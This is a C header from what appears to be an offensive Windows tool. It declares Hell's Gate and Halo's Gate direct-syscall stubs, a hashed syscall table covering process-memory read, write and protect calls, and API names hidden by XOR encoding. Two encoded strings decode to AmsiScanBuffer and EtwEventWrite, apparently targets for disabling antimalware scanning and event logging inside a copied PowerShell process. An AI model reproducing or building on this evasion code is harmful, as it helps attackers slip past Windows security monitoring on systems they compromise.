#pragma once

#include <Windows.h>
#include <stdio.h>

#define BUFSIZE 4096 
#define SYSCALLSCOUNT 470
#define KEY 0xd1
#define HASHKEY 0x416264616c6c6168
#define INVALID_SSN -1
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* Colors */
#define BOLD "\033[1m"
#define GREEN "\033[0;32m"
#define BLUE "\033[0;34m"
#define RED "\033[0;31m"
#define NC "\033[0m"
#define NL "\n"

/* Log macros */
#define PRINT_SUCCESS(fmt, ...) printf(GREEN "[+] " NC BOLD fmt NL NC, __VA_ARGS__)
#define PRINT_STATUS(fmt, ...) printf(BLUE "[*] " NC BOLD fmt NL NC, __VA_ARGS__)
#define PRINT_ERROR(fmt, ...) printf(RED "[!] " NC BOLD fmt NL NC, __VA_ARGS__)

/* a new copy of powershell.exe */
#define PWSH "C:\\Windows\\Temp\\pwsh.exe"

#define IMAGE_DEBUG_SIGNATURE 0x53445352

#define GETMODULEBASE(x) ((PVOID)x->pDosHdr)
#define ENDSWITHW(x1, x2) ((wcslen(x2) > wcslen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1 + wcslen(x1) - wcslen(x2), x2, wcslen(x2))))


typedef BOOL(WINAPI* tCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* tTerminateProcess)(HANDLE, UINT);
typedef HMODULE(WINAPI* tLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* tCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef BOOL(WINAPI* tDeleteFileA)(LPCSTR);
typedef VOID(WINAPI* tSleep)(DWORD);
typedef DWORD(WINAPI* tWaitForSingleObject)(HANDLE, DWORD);
typedef DWORD(WINAPI* tResumeThread)(HANDLE);


typedef struct
{
    PIMAGE_DOS_HEADER pDosHdr;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_EXPORT_DIRECTORY pExpDir;
    PIMAGE_SECTION_HEADER pTextSection;
    DWORD dwSizeOfImage;
    PDWORD pdwAddrOfFunctions;
    PDWORD pdwAddrOfNames;
    PWORD pwAddrOfNameOrdinales;
} IMAGE, * PIMAGE;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		VOID* Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS lExitStatus;
    _PPEB pPebBaseAddress;
    ULONG_PTR ullAffinityMask;
    LONG lBasePriority;
    ULONG_PTR ullUniqueProcessId;
    ULONG_PTR ullInheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef struct _PdbInfo
{
    DWORD     dwSignature;
    BYTE      Guid[16];
    DWORD     dwAge;
    CHAR      cPdbFileName[16]; // powershell.pdb
} PdbInfo, * PPdbInfo;

typedef enum _PROCESSINFOCLASS
{
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS, * PPROCESSINFOCLASS;

typedef struct _APIS
{
    tLoadLibraryA pLoadLibraryA;
    tCreateProcessA pCreateProcessA;
    tTerminateProcess pTerminateProcess;
    tCopyFileA pCopyFileA;
    tDeleteFileA pDeleteFileA;
    tSleep pSleep;
    tWaitForSingleObject pWaitForSingleObject;
    tResumeThread pResumeThread;
} APIS, * PAPIS;

typedef struct _SYSCALL_ENTRY
{
    DWORD64 dwHash;
    WORD wSyscall;
} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE
{
    /* NtWriteFile */
    SYSCALL_ENTRY WF;

    /* NtReadFile */
    SYSCALL_ENTRY RF;

    /* NtProtectVirtualMemory */
    SYSCALL_ENTRY PVM;

    /* NtWriteVirtualMemory */
    SYSCALL_ENTRY WVM;

    /* NtReadVirtualMemory */
    SYSCALL_ENTRY RVM;

    /* NtQueryInformationProcess */
    SYSCALL_ENTRY QIP;
} SYSCALL_TABLE, * PSYSCALL_TABLE;


extern HMODULE GetModuleHandleW2(LPCWCHAR);
extern PVOID GetProcAddress2(HMODULE, LPCCH);
extern WORD HellsGateGrabber(PVOID);
extern VOID HellsGate(WORD);
extern NTSTATUS HellDescent();
extern WORD HaloGateDown(PVOID, WORD);
extern WORD HaloGateUp(PVOID, WORD);
extern WORD VelesReek(DWORD, PVOID, PVOID);


APIS g_APIs;
SYSCALL_TABLE g_SYSCALLs;

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

CHAR g_cLoadLibraryA[] = { 0x9d, 0xbe, 0xb0, 0xb5, 0x9d, 0xb8, 0xb3, 0xa3, 0xb0, 0xa3, 0xa8, 0x90, 0x0 };
CHAR g_cCreateProcessA[] = { 0x92, 0xa3, 0xb4, 0xb0, 0xa5, 0xb4, 0x81, 0xa3, 0xbe, 0xb2, 0xb4, 0xa2, 0xa2, 0x90, 0x0 };
CHAR g_cTerminateProcess[] = { 0x85, 0xb4, 0xa3, 0xbc, 0xb8, 0xbf, 0xb0, 0xa5, 0xb4, 0x81, 0xa3, 0xbe, 0xb2, 0xb4, 0xa2, 0xa2, 0x0 };
CHAR g_cCopyFileA[] = { 0x92, 0xbe, 0xa1, 0xa8, 0x97, 0xb8, 0xbd, 0xb4, 0x90, 0x0 };
CHAR g_cDeleteFileA[] = { 0x95, 0xb4, 0xbd, 0xb4, 0xa5, 0xb4, 0x97, 0xb8, 0xbd, 0xb4, 0x90, 0x0 };
CHAR g_cSleep[] = { 0x82, 0xbd, 0xb4, 0xb4, 0xa1, 0x0 };
CHAR g_cWaitForSingleObject[] = { 0x86, 0xb0, 0xb8, 0xa5, 0x97, 0xbe, 0xa3, 0x82, 0xb8, 0xbf, 0xb6, 0xbd, 0xb4, 0x9e, 0xb3, 0xbb, 0xb4, 0xb2, 0xa5, 0x0 };
CHAR g_cResumeThread[] = { 0x83, 0xb4, 0xa2, 0xa4, 0xbc, 0xb4, 0x85, 0xb9, 0xa3, 0xb4, 0xb0, 0xb5, 0x0 };
CHAR g_cASB[] = { 0x90, 0xbc, 0xa2, 0xb8, 0x82, 0xb2, 0xb0, 0xbf, 0x93, 0xa4, 0xb7, 0xb7, 0xb4, 0xa3, 0x0 };
CHAR g_cEEW[] = { 0x94, 0xa5, 0xa6, 0x94, 0xa7, 0xb4, 0xbf, 0xa5, 0x86, 0xa3, 0xb8, 0xa5, 0xb4, 0x0 };